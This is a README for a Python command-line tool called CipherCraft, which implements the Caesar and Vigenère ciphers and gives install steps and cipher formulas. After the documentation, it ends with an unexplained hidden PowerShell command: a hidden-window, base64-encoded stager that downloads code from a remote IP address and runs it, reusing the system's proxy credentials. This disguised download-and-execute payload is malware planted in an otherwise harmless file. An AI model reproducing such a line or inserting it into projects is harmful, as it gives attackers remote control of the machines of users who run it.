# **CipherCraft - A command-line tool for classical cryptography**

#### **Installation :**
  
1. **Clone or download the project** into a local directory.

2. **Navigate to the project directory** in your terminal.

```shell
cd path/to/your/project/folder
```

3. **It is recommended to use a virtual environment.**

```shell
python -m venv venv

source venv/bin/activate # On Windows: venv\Scripts\activate
```
---

#### **Structure :**
- main.py : The main entry point of the application. 
- ui.py : Handles all user interface elements (menus, headers, colored text). 
- ciphers.py : Contains the implementation of the cipher algorithms.

#### **Core Features :**
- Interactive Menu: A user-friendly, menu-driven interface. 
- Multiple Cipher Support: 
	- Caesar Cipher: A simple substitution cipher. 
	- Vigenère Cipher: A more advanced polyalphabetic substitution cipher.

#### **Technical Stack & Libraries :**
- Language : Python 3 
- Key Libraries : os, platform, time

#### **What is Caesar Cipher Technique?**
The Caesar cipher is a simple encryption technique that was used by Julius Caesar to send secret messages to his allies. It works by shifting the letters in the plaintext message by a certain number of positions, known as the "shift" or "key". The Caesar Cipher technique is one of the earliest and simplest methods of encryption techniques.

```
En​(x)=(x+n)mod 26  
(Encryption Phase with shift n)

Dn(x)=(x−n)mod 26                
(Decryption Phase with shift n)
```

#### **What is Vigenere Cipher Technique?**
Vigenere Cipher is a method of encrypting alphabetic text. It uses a simple form of polyalphabetic substitution. A polyalphabetic cipher is any cipher based on substitution, using multiple substitution alphabets. The encryption of the original text is done using the Vigenère square or Vigenère table.

```
Encryption :
The plaintext(P) and key(K) are added modulo 26.  
Ei = (Pi + Ki) mod 26  
  
Decryption :
Di = (Ei - Ki) mod 26
```



powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABlAEkATAA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJABlAEkATAAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAGUASQBMAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgAxADQAOAAuADEANAA3ADoAOAAwADgAMAAvAHYASgBWAEwAdgBiAC8AegB2AHgAVQBRAHYAMABjACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADEANAA4AC4AMQA0ADcAOgA4ADAAOAAwAC8AdgBKAFYATAB2AGIAJwApACkAOwA=


